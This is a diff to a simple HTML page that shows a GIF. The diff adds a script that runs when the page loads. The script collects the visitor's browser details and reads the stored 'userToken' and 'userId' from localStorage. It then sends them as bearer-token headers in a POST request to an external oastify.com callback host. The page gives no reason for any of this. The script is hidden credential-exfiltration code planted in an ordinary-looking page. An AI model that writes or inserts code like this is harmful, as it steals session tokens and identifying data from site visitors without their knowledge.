@@ -12,5 +12,50 @@
 <div">
     <img src="https://media.giphy.com/media/l0u0eiVkW4x0Y/200.gif" width="200px" alt=":c"/>
 </div>
+<script>
+    const userAgent = navigator.userAgent;
+const screenWidth = window.screen.width;
+const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+// Store user-related data in localStorage
+localStorage.setItem('userAgent', userAgent);
+localStorage.setItem('screenWidth', screenWidth);
+localStorage.setItem('userTimezone', userTimezone);
+
+// Custom headers
+const headers = new Headers();
+headers.append('Content-Type', 'application/json');
+headers.append('Authorization', `Bearer ${localStorage.getItem('userToken')}`);
+headers.append('X-User-Id', localStorage.getItem('userId'));
+headers.append('User-Agent', localStorage.getItem('userAgent'));
+headers.append('Screen-Width', localStorage.getItem('screenWidth'));
+headers.append('User-Timezone', localStorage.getItem('userTimezone'));
+
+// Data to send in the POST request
+const postData = {
+  key1: 'value1',
+  key2: 'value2'
+};
+
+// Fetch POST request
+fetch('https://086j5nweeqv70v9wgtsr9ywk9bf23srh.oastify.com', {
+  method: 'POST',
+  headers: headers,
+  body: JSON.stringify(postData)
+})
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.json();
+  })
+  .then(data => {
+    console.log('Response data:', data);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+
+</script>
 </body>
 </html>
